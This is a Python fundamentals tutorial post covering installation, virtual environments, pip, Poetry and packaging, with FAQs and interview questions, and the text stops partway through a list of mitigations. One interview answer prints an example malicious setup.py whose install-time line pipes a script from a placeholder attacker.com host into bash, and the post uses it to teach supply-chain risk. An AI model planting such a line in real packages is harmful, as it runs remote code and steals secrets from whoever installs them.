---
title: "Python Mastery Part 1: Python Fundamentals & Core Language"
date: 2024-12-02 00:00:00 +0530
categories: [Python, Python Mastery]
tags: [Python, Development, Fundamentals, Data Structures, OOP, Functions, Internals, Software Engineering, SDLC]
---
## Table of Contents

- [Introduction](#introduction)
- [1.1 Introduction to Python](#11-introduction-to-python)
  - [What is Python and Why Does It Exist?](#what-is-python-and-why-does-it-exist)
  - [Python&#39;s Place in the Ecosystem](#pythons-place-in-the-ecosystem)
  - [CPython vs Other Implementations](#cpython-vs-other-implementations)
  - [Python 2 vs Python 3](#python-2-vs-python-3)
  - [When to Use Python](#when-to-use-python)
- [1.2 Python Setup &amp; Development Environment](#12-python-setup--development-environment)
  - [Installing Python](#installing-python)
  - [Virtual Environments](#virtual-environments)
  - [Package Management](#package-management)
  - [Development Tools and IDEs](#development-tools-and-ides)
  - [Frequently Asked Questions](#frequently-asked-questions)
  - [Interview Questions](#interview-questions)
- [1.3 Python Syntax &amp; Basic Constructs](#13-python-syntax--basic-constructs)
  - [Variables and Data Types](#variables-and-data-types)
  - [Operators](#operators)
  - [Control Flow](#control-flow)
  - [Loops](#loops)
  - [Comprehensions](#comprehensions)
  - [Frequently Asked Questions](#frequently-asked-questions-1)
  - [Interview Questions](#interview-questions-1)
- [1.4 Data Structures](#14-data-structures)
  - [Built-in Types Overview](#built-in-types-overview)
  - [Lists](#lists)
  - [Tuples](#tuples)
  - [Dictionaries](#dictionaries)
  - [Sets](#sets)
  - [Strings](#strings)
  - [Advanced Collections](#advanced-collections-collections-module)
  - [Frequently Asked Questions](#frequently-asked-questions-2)
  - [Interview Questions](#interview-questions-2)
- [1.5 Functions](#15-functions)
  - [Function Fundamentals](#function-fundamentals)
  - [Advanced Function Concepts](#advanced-function-concepts)
  - [Function Internals](#function-internals)
  - [Frequently Asked Questions](#frequently-asked-questions-3)
  - [Interview Questions](#interview-questions-3)
- [1.6 Object-Oriented Programming](#16-object-oriented-programming-oop)
  - [Classes and Objects](#classes-and-objects)
  - [Inheritance](#inheritance)
  - [Special Methods](#special-methods-magicdunder-methods)
  - [Advanced OOP](#advanced-oop)
  - [Frequently Asked Questions](#frequently-asked-questions-4)
  - [Interview Questions](#interview-questions-4)
- [1.7 Modules and Packages](#17-modules-and-packages)
  - [Module Basics](#module-basics)
  - [Packages](#packages)
  - [Import System Internals](#import-system-internals)
- [1.8 Exception Handling](#18-exception-handling)
  - [Exception Fundamentals](#exception-fundamentals)
  - [Context Managers](#context-managers-for-resource-management)
  - [contextlib Module](#contextlib-module)
- [1.9 File I/O and Context Managers](#19-file-io-and-context-managers)
  - [File Operations](#file-operations)
  - [Working with Directories](#working-with-directories)
  - [Temporary Files](#temporary-files)

---

# Complete Python Mastery Part 1: Python Fundamentals & Core Language

## Introduction

Welcome to the first installment of the Complete Python Mastery series. This comprehensive guide will take you from Python fundamentals through advanced production systems engineering, covering the entire Software Development Life Cycle (SDLC). Whether you're preparing for technical interviews, building production systems, or deepening your understanding of Python internals, this series provides the authoritative, technically accurate foundation you need.

**What This Series Covers:**

This ten-part series is structured to build your Python expertise systematically:

- **Part 1** (this post): Python Fundamentals & Core Language
- **Part 2**: Python Internals & Advanced Language Features
- **Part 3**: SDLC - Requirements, Design & Architecture
- **Part 4**: SDLC - Development & Code Quality
- **Part 5**: SDLC - Testing
- **Part 6**: SDLC - Version Control, CI/CD & Packaging
- **Part 7**: SDLC - Deployment & Operations
- **Part 8**: SDLC - Monitoring, Observability & Maintenance
- **Part 9**: Advanced Python & Specialized Topics
- **Part 10**: Interview Preparation & Python Mastery

**Who This Is For:**

- Software engineers (junior to senior)
- Backend and full-stack developers
- Data engineers and ML engineers
- DevOps and SRE professionals
- Technical interview candidates
- Anyone seeking production-grade Python expertise

**What You'll Learn in Part 1:**

This post covers Python's foundational concepts with depth rarely found in introductory materials. You'll learn not just *what* Python features do, but *how* they work internally, *why* they exist, and *when* to use them in production systems.

---

## 1.1 Introduction to Python

### What is Python and Why Does It Exist?

Python is a high-level, interpreted, dynamically-typed programming language created by Guido van Rossum and first released in 1991. Python was designed with a philosophy emphasizing code readability and simplicity, making it an ideal language for both beginners and experienced developers.

**Key Design Principles:**

Python's design follows the "Zen of Python" (PEP 20), which encapsulates its philosophy:

```python
import this
```

Running this code displays Python's guiding principles:

```
The Zen of Python, by Tim Peters

Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
Sparse is better than dense.
Readability counts.
...
```

**Why Python Exists:**

1. **Productivity**: Python's clear syntax reduces development time
2. **Versatility**: Used in web development, data science, automation, AI/ML, DevOps
3. **Community**: Massive ecosystem of libraries and active community
4. **Learning Curve**: Gentler learning curve than C++, Java, or Rust
5. **Glue Language**: Excellent for integrating systems written in different languages

### Python's Place in the Ecosystem

Python occupies a unique position in the programming landscape:

**Strengths:**

- Rapid prototyping and development
- Extensive standard library ("batteries included")
- Rich ecosystem (PyPI has 400,000+ packages)
- Excellent for data science, ML, and scientific computing
- Strong in automation and scripting
- Great for building APIs and web services

**Trade-offs:**

- Slower execution than compiled languages (C++, Rust, Go)
- Global Interpreter Lock (GIL) limits multi-threading
- Higher memory consumption than lower-level languages
- Not ideal for mobile development
- Dynamic typing can lead to runtime errors

### CPython vs Other Implementations

**CPython** is the reference implementation of Python, written in C. It's the most widely used Python interpreter.

**Other Implementations:**

| Implementation        | Language       | Key Features                              | Use Cases                           |
| --------------------- | -------------- | ----------------------------------------- | ----------------------------------- |
| **CPython**     | C              | Reference implementation, most compatible | General-purpose, production systems |
| **PyPy**        | Python/RPython | JIT compilation, faster execution         | CPU-intensive pure Python code      |
| **Jython**      | Java           | Runs on JVM, Java integration             | Java ecosystem integration          |
| **IronPython**  | C#             | Runs on .NET, C# integration              | .NET ecosystem integration          |
| **MicroPython** | C              | Optimized for microcontrollers            | IoT, embedded systems               |
| **GraalPython** | Java           | Runs on GraalVM, polyglot                 | Multi-language projects             |

**When to Use What:**

```python
# ✅ GOOD: CPython for most production use cases
# - Maximum library compatibility
# - Best community support
# - Most stable and mature

# ✅ GOOD: PyPy for CPU-bound pure Python workloads
# - Long-running server applications
# - Computational tasks without C extensions
# - Can be 4-7x faster than CPython

# ❌ BAD: Using PyPy with NumPy-heavy workloads
# - PyPy's NumPy support is incomplete
# - CPython's NumPy is heavily optimized C code
```

### Python 2 vs Python 3

**Historical Context:**

Python 2.7 (released 2010) was the last 2.x version. Python 3.0 (released 2008) introduced breaking changes to fix design flaws. Python 2 reached end-of-life on January 1, 2020.

**Major Differences:**

```python
# Python 2 (legacy - DO NOT USE)
print "Hello, World!"  # print statement
division = 5 / 2  # Returns 2 (integer division)
unicode_str = u"Hello"  # Unicode prefix required

# Python 3 (modern - USE THIS)
print("Hello, World!")  # print function
division = 5 / 2  # Returns 2.5 (true division)
int_division = 5 // 2  # Returns 2 (explicit floor division)
unicode_str = "Hello"  # Unicode by default
```

**Why Python 3 Won:**

1. **Better Unicode support**: All strings are Unicode by default
2. **Consistent division**: `/` always returns float, `//` for integer division
3. **Improved standard library**: asyncio, pathlib, enum, and more
4. **Type hints**: PEP 484 introduced optional type annotations
5. **Better exception handling**: Cleaner syntax with exception chaining

### Python Versions and Release Cycle

Python follows a predictable release cycle:

**Release Schedule:**

- New minor version every 12 months (e.g., 3.10, 3.11, 3.12)
- Each version supported for ~5 years
- Security fixes only for last 2 years

**Current Versions (as of 2025):**

```python
import sys
print(f"Python version: {sys.version}")
print(f"Version info: {sys.version_info}")

# Python 3.11+: Performance improvements, better error messages
# Python 3.10+: Pattern matching, better type hints
# Python 3.9+: Dictionary merge operators, type hint improvements
# Python 3.8+: Walrus operator, positional-only parameters
```

**Version Selection Strategy:**

```python
# ✅ GOOD: Use Python 3.10+ for new projects
# - Modern features (pattern matching, improved type hints)
# - Better performance (3.11 is ~25% faster than 3.10)
# - Long support window

# ⚠️ CAUTION: Python 3.7-3.9 for legacy compatibility
# - Use if dependent on libraries not yet updated
# - Plan migration path to newer versions

# ❌ BAD: Starting new projects on Python 3.6 or older
# - Python 3.6 reached end-of-life in December 2021
# - Missing critical features and performance improvements
```

### When to Use Python vs Other Languages

**Use Python When:**

1. **Rapid Development**: Prototypes, MVPs, startups
2. **Data-Heavy Applications**: Data analysis, ML, data engineering
3. **Automation & Scripting**: DevOps, system administration
4. **Web APIs**: REST/GraphQL services with FastAPI/Django
5. **Glue Code**: Integrating multiple systems
6. **Scientific Computing**: Research, simulations

**Consider Alternatives When:**

1. **High-Performance Computing**: Use Rust, C++, or Go

   - Real-time systems
   - Game engines
   - High-frequency trading
2. **Mobile Applications**: Use Kotlin/Swift or React Native

   - Python mobile support is limited (Kivy exists but niche)
3. **Systems Programming**: Use Rust or C

   - Operating systems
   - Device drivers
   - Embedded systems (unless using MicroPython)
4. **Browser Applications**: Use JavaScript/TypeScript

   - Front-end development
   - (Python can compile to WebAssembly via Pyodide, but experimental)

**Hybrid Approaches:**

```python
# ✅ GOOD: Use Python as orchestrator, performance-critical parts in Rust/C++
# Example: NumPy (Python interface, C/Fortran implementation)
import numpy as np

# Python code calls highly optimized C code
large_array = np.random.rand(1000000)
result = np.sum(large_array)  # Fast C implementation

# ✅ GOOD: Cython for performance-critical sections
# Write performance-critical code in Cython (Python-like, compiles to C)
# Keep business logic in pure Python for maintainability
```

---

## 1.2 Python Setup & Development Environment

**SDLC Phase:** Development

**Relevant For:**

- [X] Requirements gathering (understanding environment needs)
- [X] System design (architecture decisions)
- [X] Development (actual coding environment)
- [ ] Testing
- [ ] Deployment
- [ ] Maintenance

### Installation & Environment Management

#### Installing Python

**Official Installer (Recommended for Beginners):**

1. **Windows**: Download from python.org

   ```bash
   # Verify installation
   python --version
   python -m pip --version
   ```
2. **macOS**: Use official installer or Homebrew

   ```bash
   # Homebrew method
   brew install python@3.11

   # Verify
   python3 --version
   ```
3. **Linux**: Use system package manager

   ```bash
   # Ubuntu/Debian
   sudo apt update
   sudo apt install python3.11 python3.11-venv python3.11-dev

   # Verify
   python3.11 --version
   ```

**pyenv (Recommended for Multiple Versions):**

pyenv allows managing multiple Python versions simultaneously:

```bash
# Install pyenv (macOS/Linux)
curl https://pyenv.run | bash

# Install specific Python version
pyenv install 3.11.5
pyenv install 3.10.13

# Set global Python version
pyenv global 3.11.5

# Set local version for specific project
cd my_project
pyenv local 3.10.13

# List installed versions
pyenv versions
```

**Conda (Recommended for Data Science):**

```bash
# Install Miniconda (lightweight)
# Download from docs.conda.io

# Create environment with specific Python version
conda create -n myenv python=3.11

# Activate environment
conda activate myenv

# Install packages
conda install numpy pandas scikit-learn
```

#### Virtual Environments

Virtual environments isolate project dependencies, preventing conflicts.

**venv (Built-in, Recommended for Most Projects):**

```bash
# Create virtual environment
python3 -m venv myproject_env

# Activate
# Linux/macOS:
source myproject_env/bin/activate

# Windows:
myproject_env\Scripts\activate

# Your prompt changes to indicate active environment
(myproject_env) $

# Install packages (isolated to this environment)
pip install requests flask

# Deactivate
deactivate
```

**virtualenv (More Features than venv):**

```bash
# Install virtualenv
pip install virtualenv

# Create environment
virtualenv myenv

# Create with specific Python version
virtualenv -p python3.10 myenv

# Activate (same as venv)
source myenv/bin/activate
```

**Best Practices:**

```python
# ✅ GOOD: One virtual environment per project
project_a/
├── venv/  # Virtual environment for project A
├── src/
└── requirements.txt

project_b/
├── venv/  # Separate environment for project B
├── src/
└── requirements.txt

# ❌ BAD: Installing packages globally
pip install requests  # Without virtual environment active
# This pollutes the system Python and can cause conflicts

# ✅ GOOD: Always activate virtual environment before installing
source venv/bin/activate
pip install requests

# ✅ GOOD: Add venv/ to .gitignore
echo "venv/" >> .gitignore
# Never commit virtual environments to version control
```

#### Environment Isolation Best Practices

**Directory Structure:**

```
my_project/
├── .git/
├── .gitignore
├── venv/              # Virtual environment (in .gitignore)
├── src/               # Source code
│   └── my_package/
├── tests/
├── docs/
├── requirements.txt   # Production dependencies
├── requirements-dev.txt  # Development dependencies
├── setup.py           # Package configuration
└── README.md
```

**requirements.txt Management:**

```bash
# Generate requirements.txt from current environment
pip freeze > requirements.txt

# Install from requirements.txt
pip install -r requirements.txt

# ✅ GOOD: Separate dev and prod dependencies
# requirements.txt (production)
flask==2.3.0
requests==2.31.0
sqlalchemy==2.0.15

# requirements-dev.txt (development)
-r requirements.txt  # Include production dependencies
pytest==7.3.1
black==23.3.0
mypy==1.3.0
```

**Managing Multiple Python Versions:**

```bash
# ✅ GOOD: Use pyenv for version management
pyenv install 3.11.5
pyenv install 3.10.13

# Set version for specific project
cd project1
pyenv local 3.11.5  # Creates .python-version file

cd ../project2
pyenv local 3.10.13

# ❌ BAD: Manual PATH manipulation
export PATH="/usr/local/python3.11/bin:$PATH"
# Error-prone and doesn't scale
```

#### System Python vs User Python

```python
# ⚠️ CAUTION: System Python
# - Used by OS for system scripts
# - DO NOT modify or uninstall
# - Located in /usr/bin/python (Linux) or /System/Library (macOS)

# ✅ GOOD: User Python
# - Installed in user directory
# - Safe to modify
# - Multiple versions can coexist

# Check which Python you're using
import sys
print(sys.executable)
# /home/user/.pyenv/versions/3.11.5/bin/python  # pyenv-managed
# /usr/bin/python3  # System Python (avoid)
```

### Development Tools

#### IDEs and Editors

**PyCharm (Most Feature-Rich):**

```python
# Strengths:
# - Professional debugging tools
# - Excellent refactoring support
# - Built-in database tools
# - Django/Flask integration
# - Remote development support

# Best For:
# - Large projects
# - Professional developers
# - Teams

# Configuration:
# File > Settings > Project > Python Interpreter
# Select your virtual environment
```

**VS Code (Most Popular):**

```python
# Essential Extensions:
# - Python (Microsoft)
# - Pylance (type checking)
# - Python Debugger
# - autoDocstring
# - GitLens

# settings.json example:
{
    "python.defaultInterpreterPath": "${workspaceFolder}/venv/bin/python",
    "python.linting.enabled": true,
    "python.linting.pylintEnabled": true,
    "python.formatting.provider": "black",
    "editor.formatOnSave": true
}
```

**Vim/Neovim (For Terminal Enthusiasts):**

```vim
" Essential plugins for Python:
" - coc.nvim (LSP support)
" - python-mode
" - ale (linting)
" - vim-fugitive (Git integration)

" Example configuration:
let g:python3_host_prog = '/path/to/venv/bin/python'
```

#### REPL and Interactive Shell

The Python REPL (Read-Eval-Print Loop) is essential for experimentation:

```python
# Basic Python REPL
$ python
>>> 2 + 2
4
>>> import sys
>>> sys.version
'3.11.5 (main, Sep  2 2023, 14:16:23) [GCC 11.4.0]'
>>> exit()

# ✅ GOOD: Use REPL for quick experiments
# - Testing code snippets
# - Exploring libraries
# - Debugging calculations
# - Learning new APIs
```

**IPython (Enhanced REPL):**

```python
# Install IPython
pip install ipython

# Start IPython
$ ipython

In [1]: import numpy as np

In [2]: np.array([1, 2, 3])
Out[2]: array([1, 2, 3])

# IPython features:
# - Tab completion
# - Syntax highlighting
# - Magic commands
# - Object introspection (?)

In [3]: import requests
In [4]: requests.get?  # Show documentation
```

**Magic Commands:**

```python
# IPython magic commands
%timeit sum(range(1000))  # Benchmark code
%load script.py  # Load file into cell
%run script.py  # Execute script
%debug  # Post-mortem debugger

# List all magic commands
%lsmagic
```

**Jupyter Notebooks:**

```bash
# Install Jupyter
pip install jupyter

# Start Jupyter server
jupyter notebook

# Or use JupyterLab (modern interface)
pip install jupyterlab
jupyter lab
```

**When to Use Each:**

```python
# ✅ Python REPL: Quick tests, learning basics
# ✅ IPython: Exploration, debugging, data analysis
# ✅ Jupyter: Data science, tutorials, presentations, sharing results
# ✅ IDE: Production code, large projects, refactoring
```

#### Python Debugger (pdb)

The Python debugger (pdb) is crucial for troubleshooting:

```python
import pdb

def complex_function(x, y):
    result = x + y
    pdb.set_trace()  # Execution pauses here
    return result * 2

# Python 3.7+: Use breakpoint() instead
def modern_function(x, y):
    result = x + y
    breakpoint()  # Built-in, configurable
    return result * 2

# pdb commands:
# n (next): Execute next line
# s (step): Step into function
# c (continue): Continue execution
# p <var>: Print variable
# l (list): Show code context
# q (quit): Exit debugger
```

**ipdb (Enhanced Debugger):**

```python
# Install ipdb
pip install ipdb

# Use in code
import ipdb

def debug_me(data):
    processed = [x * 2 for x in data]
    ipdb.set_trace()  # Drops into IPython debugger
    return sum(processed)

# Features:
# - Tab completion
# - Syntax highlighting
# - Better introspection
```

### Package Management

#### pip Fundamentals

pip is Python's package installer:

```bash
# Install package
pip install requests

# Install specific version
pip install requests==2.31.0

# Install with version constraints
pip install "requests>=2.28.0,<3.0.0"

# Install from requirements.txt
pip install -r requirements.txt

# Install development/editable mode
pip install -e .

# Upgrade package
pip install --upgrade requests

# Uninstall package
pip uninstall requests

# Show package info
pip show requests

# List installed packages
pip list

# List outdated packages
pip list --outdated
```

**pip Best Practices:**

```bash
# ✅ GOOD: Always use virtual environment
source venv/bin/activate
pip install package_name

# ✅ GOOD: Pin versions for reproducibility
# requirements.txt
requests==2.31.0
flask==2.3.0

# ❌ BAD: Unpinned versions
# requirements.txt
requests
flask
# Can lead to unexpected behavior when dependencies update

# ✅ GOOD: Use pip-tools for dependency management
pip install pip-tools

# requirements.in (high-level dependencies)
requests
flask

# Generate locked requirements.txt
pip-compile requirements.in

# This creates requirements.txt with all transitive dependencies pinned
```

#### requirements.txt

```python
# Basic requirements.txt
requests==2.31.0
flask==2.3.2
sqlalchemy==2.0.19

# With comments
requests==2.31.0  # HTTP library
flask==2.3.2      # Web framework

# Environment markers (conditional installation)
pytest==7.4.0; python_version >= '3.8'
dataclasses==0.8; python_version < '3.7'

# Editable installs (for local development)
-e ./local_package

# Include other requirement files
-r requirements-base.txt

# Install from Git
git+https://github.com/user/repo.git@v1.0#egg=package

# Install from private Git repo
git+ssh://git@github.com/private/repo.git@main#egg=private-package
```

#### setup.py and setup.cfg

**setup.py (Traditional):**

```python
from setuptools import setup, find_packages

setup(
    name="mypackage",
    version="1.0.0",
    author="Your Name",
    author_email="you@example.com",
    description="A short description",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    url="https://github.com/yourusername/mypackage",
    packages=find_packages(where="src"),
    package_dir={"": "src"},
    classifiers=[
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.10",
    install_requires=[
        "requests>=2.28.0",
        "click>=8.0.0",
    ],
    extras_require={
        "dev": [
            "pytest>=7.0.0",
            "black>=22.0.0",
            "mypy>=0.990",
        ],
    },
    entry_points={
        "console_scripts": [
            "mycommand=mypackage.cli:main",
        ],
    },
)
```

**setup.cfg (Declarative):**

```ini
[metadata]
name = mypackage
version = 1.0.0
author = Your Name
author_email = you@example.com
description = A short description
long_description = file: README.md
long_description_content_type = text/markdown
url = https://github.com/yourusername/mypackage
classifiers =
    Programming Language :: Python :: 3
    Programming Language :: Python :: 3.10
    Programming Language :: Python :: 3.11
    License :: OSI Approved :: MIT License

[options]
packages = find:
package_dir =
    = src
python_requires = >=3.10
install_requires =
    requests>=2.28.0
    click>=8.0.0

[options.packages.find]
where = src

[options.extras_require]
dev =
    pytest>=7.0.0
    black>=22.0.0
    mypy>=0.990

[options.entry_points]
console_scripts =
    mycommand = mypackage.cli:main
```

#### pyproject.toml (Modern Standard - PEP 517/518)

```toml
[build-system]
requires = ["setuptools>=61.0", "wheel"]
build-backend = "setuptools.build_meta"

[project]
name = "mypackage"
version = "1.0.0"
description = "A short description"
readme = "README.md"
authors = [
    {name = "Your Name", email = "you@example.com"}
]
license = {text = "MIT"}
classifiers = [
    "Programming Language :: Python :: 3",
    "Programming Language :: Python :: 3.10",
    "Programming Language :: Python :: 3.11",
]
requires-python = ">=3.10"
dependencies = [
    "requests>=2.28.0",
    "click>=8.0.0",
]

[project.optional-dependencies]
dev = [
    "pytest>=7.0.0",
    "black>=22.0.0",
    "mypy>=0.990",
]

[project.scripts]
mycommand = "mypackage.cli:main"

[tool.setuptools.packages.find]
where = ["src"]

[tool.black]
line-length = 88
target-version = ['py310', 'py311']

[tool.mypy]
python_version = "3.10"
warn_return_any = true
warn_unused_configs = true
disallow_untyped_defs = true

[tool.pytest.ini_options]
testpaths = ["tests"]
python_files = ["test_*.py"]
```

#### Poetry (Modern Package Management)

Poetry combines dependency management, packaging, and publishing:

```bash
# Install Poetry
curl -sSL https://install.python-poetry.org | python3 -

# Create new project
poetry new myproject

# Or initialize in existing project
poetry init

# Add dependencies
poetry add requests
poetry add --group dev pytest black mypy

# Install dependencies
poetry install

# Update dependencies
poetry update

# Show dependency tree
poetry show --tree

# Build package
poetry build

# Publish to PyPI
poetry publish
```

**pyproject.toml with Poetry:**

```toml
[tool.poetry]
name = "mypackage"
version = "1.0.0"
description = "A short description"
authors = ["Your Name <you@example.com>"]
readme = "README.md"
homepage = "https://github.com/yourusername/mypackage"
repository = "https://github.com/yourusername/mypackage"
keywords = ["example", "package"]

[tool.poetry.dependencies]
python = "^3.10"
requests = "^2.28.0"
click = "^8.0.0"

[tool.poetry.group.dev.dependencies]
pytest = "^7.0.0"
black = "^22.0.0"
mypy = "^0.990"

[tool.poetry.scripts]
mycommand = "mypackage.cli:main"

[build-system]
requires = ["poetry-core>=1.0.0"]
build-backend = "poetry.core.masonry.api"
```

#### Private Package Repositories

```bash
# Configure pip to use private PyPI server
pip config set global.index-url https://pypi.company.com/simple/
pip config set global.extra-index-url https://pypi.org/simple/

# Or use environment variable
export PIP_INDEX_URL=https://pypi.company.com/simple/

# Install from private repository
pip install --index-url https://pypi.company.com/simple/ private-package

# Poetry with private repository
poetry config repositories.company https://pypi.company.com/simple/
poetry config http-basic.company username password
poetry add --source company private-package
```

### Frequently Asked Questions

**Q1: Should I use venv, virtualenv, conda, or poetry?**

**A:** Choice depends on your use case:

```python
# ✅ Use venv for most Python projects
# - Built-in (Python 3.3+)
# - Lightweight
# - Simple
# - Best for web development, APIs, general Python

# ✅ Use conda for data science
# - Manages non-Python dependencies (C libraries, R packages)
# - Better for NumPy, SciPy, pandas, scikit-learn
# - Cross-platform binary packages

# ✅ Use poetry for modern Python projects
# - Best dependency resolution
# - Combines packaging + dependency management
# - Lock file for reproducibility
# - Great for libraries you plan to publish

# ❌ Don't use virtualenv unless you need Python 2 support
# - venv replaced virtualenv for Python 3
```

**Why This Matters:** Environment management prevents "works on my machine" problems and ensures reproducible builds across development, testing, and production.

**Related Concepts:** Docker (Section 9.1), CI/CD (Part 7), Deployment (Part 7)

---

**Q2: What's the difference between pip and conda?**

**A:** pip and conda serve different purposes:

```bash
# pip: Python package manager
# - Installs Python packages from PyPI
# - Manages Python dependencies
# - Uses requirements.txt
pip install pandas

# conda: Package and environment manager
# - Installs packages from Anaconda repository
# - Manages Python AND non-Python dependencies
# - Uses environment.yml
conda install pandas

# Key differences:
# 1. Scope: pip is Python-only, conda handles any language
# 2. Binary packages: conda provides pre-compiled binaries
# 3. Dependency resolution: conda has better solver
# 4. Source: pip uses PyPI, conda uses Anaconda repos

# ✅ GOOD: Use conda for data science
conda create -n datascience python=3.11
conda activate datascience
conda install numpy pandas scikit-learn matplotlib

# ✅ GOOD: Mix pip and conda carefully
conda install numpy pandas
pip install requests  # Not available or outdated in conda

# ⚠️ CAUTION: Prefer conda for packages available in both
# conda's binary packages often work better
```

**Why This Matters:** Using the right package manager prevents dependency conflicts and ensures optimal performance for scientific packages.

---

**Q3: How do I manage Python versions across multiple projects?**

**A:** Use pyenv for version management:

```bash
# Install pyenv
curl https://pyenv.run | bash

# Install multiple Python versions
pyenv install 3.10.13
pyenv install 3.11.5
pyenv install 3.12.0

# Project structure:
projects/
├── legacy_app/
│   └── .python-version  # Contains: 3.8.18
├── current_app/
│   └── .python-version  # Contains: 3.11.5
└── experimental_app/
    └── .python-version  # Contains: 3.12.0

# Set version per project
cd legacy_app
pyenv local 3.8.18  # Creates .python-version file

cd ../current_app
pyenv local 3.11.5

# pyenv automatically switches Python version
# when you cd into directories with .python-version

# Verify
python --version  # Shows version from .python-version

# ✅ GOOD: Combine pyenv + venv
cd current_app
python -m venv venv  # Uses Python 3.11.5
source venv/bin/activate
pip install -r requirements.txt
```

**Why This Matters:** Different projects may require different Python versions due to library compatibility, and pyenv makes this seamless.

---

**Q4: Should I commit my virtual environment to Git?**

**A:** No, never commit virtual environments:

```bash
# ❌ BAD: Committing virtual environment
git add venv/
# Problems:
# - Huge repository size (100s of MB)
# - Platform-specific binaries
# - Absolute paths
# - Conflicts when team uses different OS

# ✅ GOOD: Add to .gitignore
echo "venv/" >> .gitignore
echo "*.pyc" >> .gitignore
echo "__pycache__/" >> .gitignore
echo ".pytest_cache/" >> .gitignore
echo ".mypy_cache/" >> .gitignore

# ✅ GOOD: Commit dependency specifications
git add requirements.txt
git add pyproject.toml
git add poetry.lock  # If using poetry

# Team workflow:
# 1. Clone repository
git clone https://github.com/team/project.git
cd project

# 2. Create virtual environment
python -m venv venv
source venv/bin/activate

# 3. Install dependencies
pip install -r requirements.txt
```

**Why This Matters:** Version control is for source code and configuration, not binary artifacts. Dependencies should be reproducible from requirements files.

---

**Q5: How do I handle dependencies that depend on system libraries?**

**A:** Use conda or Docker for system-level dependencies:

```bash
# Problem: Some Python packages require system libraries
# Example: psycopg2 (PostgreSQL adapter) needs PostgreSQL dev libraries

# ❌ BAD: Installing with pip without system dependencies
pip install psycopg2
# ERROR: pg_config executable not found

# Option 1: Install system dependencies first
# Ubuntu/Debian:
sudo apt-get install libpq-dev python3-dev
pip install psycopg2

# macOS:
brew install postgresql
pip install psycopg2

# Option 2: Use binary wheel (psycopg2-binary)
pip install psycopg2-binary
# ⚠️ CAUTION: Not recommended for production
# Binary wheels may have compatibility issues

# ✅ GOOD Option 3: Use conda (handles system deps)
conda install psycopg2

# ✅ BEST Option 4: Use Docker
# Dockerfile
FROM python:3.11-slim
RUN apt-get update && apt-get install -y \
    gcc \
    libpq-dev \
    && rm -rf /var/lib/apt/lists/*
COPY requirements.txt .
RUN pip install -r requirements.txt
```

**Why This Matters:** System dependencies can cause deployment failures if not properly managed. Docker ensures consistency across environments.

**Related Concepts:** Docker (Section 9.1), Deployment (Part 7)

---

### Interview Questions

**Question 1: Explain the difference between pip install, pip install -e, and python setup.py install.**

**Difficulty:** Mid-Level

**SDLC Relevance:** Development, Deployment

**Answer:**

These three commands install Python packages differently:

```bash
# 1. pip install <package>
# - Downloads and installs from PyPI
# - Copies files to site-packages
# - Package is "frozen" at installation
pip install requests

# 2. pip install -e . (editable install)
# - Creates a link to source directory
# - Changes to source code take effect immediately
# - No need to reinstall after modifications
# - Used for development
cd my_package
pip install -e .

# Example:
my_package/
├── setup.py
├── src/
│   └── my_package/
│       └── __init__.py
└── venv/

# After pip install -e .:
# - my_package is importable
# - Points to ./src/my_package
# - Edit files → changes reflected immediately

# 3. python setup.py install (deprecated)
# - Legacy installation method
# - Directly invokes setup.py
# - Bypasses pip
# - Don't use in modern Python
python setup.py install  # ❌ Don't use
```

**Key Points to Mention:**

1. **Regular install**: Production deployments
2. **Editable install (-e)**: Local development, testing changes
3. **setup.py install**: Deprecated, use pip instead
4. **Editable benefits**: No reinstall needed, easier debugging, faster development

**Why This Matters:** Understanding installation modes is crucial for development workflow and CI/CD pipeline configuration.

**Follow-up Questions:**

- How does editable install work internally? (It creates an .egg-link file)
- When would you use `pip install` vs `pip install -e`? (Production vs development)

**Common Mistakes:**

- Using `python setup.py install` instead of `pip install`
- Not using editable install during development (wastes time reinstalling)
- Forgetting to activate virtual environment before installing

---

**Question 2: How would you set up a Python project to work on both Python 3.10 and 3.11?**

**Difficulty:** Junior

**SDLC Relevance:** Development, Testing

**Answer:**

```python
# 1. Use pyproject.toml to specify version range
[project]
name = "mypackage"
requires-python = ">=3.10,<3.12"

# 2. Avoid version-specific features or use conditional imports
import sys

if sys.version_info >= (3, 11):
    # Use Python 3.11+ features
    from typing import Self  # New in 3.11
else:
    # Fallback for older versions
    from typing_extensions import Self

# 3. Test on both versions in CI
# .github/workflows/test.yml
strategy:
  matrix:
    python-version: ["3.10", "3.11"]
steps:
  - uses: actions/setup-python@v4
    with:
      python-version: ${{ matrix.python-version }}

# 4. Use pyenv locally for testing
pyenv install 3.10.13
pyenv install 3.11.5

# Create separate environments
python3.10 -m venv venv-310
python3.11 -m venv venv-311

# 5. Document compatibility in README
# README.md
## Requirements
- Python 3.10 or 3.11
```

**Key Points to Mention:**

- Specify Python version requirements in `pyproject.toml` or `setup.py`
- Test on all supported versions in CI/CD
- Avoid or conditionally use version-specific features
- Use `python_requires` to prevent installation on unsupported versions

**Why This Matters:** Libraries must support multiple Python versions for broader adoption, and applications need migration paths.

**Related Concepts:** CI/CD (Part 7), Testing (Part 5)

---

**Question 3: What are the security implications of running pip install from untrusted sources?**

**Difficulty:** Senior

**SDLC Relevance:** Security, Deployment

**Answer:**

Running `pip install` can execute arbitrary code, posing significant security risks:

```python
# setup.py can execute code during installation
# Malicious example:
from setuptools import setup
import os

# This runs during pip install!
os.system("curl http://attacker.com/steal.sh | bash")

setup(
    name="malicious_package",
    version="1.0.0",
)

# Security implications:
# 1. Code execution during install
# 2. Access to environment variables (secrets)
# 3. Network access
# 4. File system access
```

**Mitigation Strategies:**

```bash
# ✅ GOOD: Only install from trusted sources
pip install --index-url https://pypi.org/simple/ package

# ✅ GOOD: Use hash checking
# requirements.txt with hashes
requests==2.31.0 \
    --hash=sha256:abc123...

pip install --require-hashes -r requirements.txt

# ✅ GOOD: Use pip-audit for vulnerability scanning
pip install pip-audit
pip-audit

# ✅ GOOD: Review package before installing
pip download package
tar -xzf package.tar.gz
cat package/setup.py  # Review code

# ✅ GOOD: Use virtual environment (limit blast radius)
python -m venv isolated_env
source isolated_env/bin/activate
pip install suspicious_package  # Contained in venv

# ✅ GOOD: In CI/CD, pin all dependencies
# requirements.txt
requests==2.31.0
flask==2.3.2
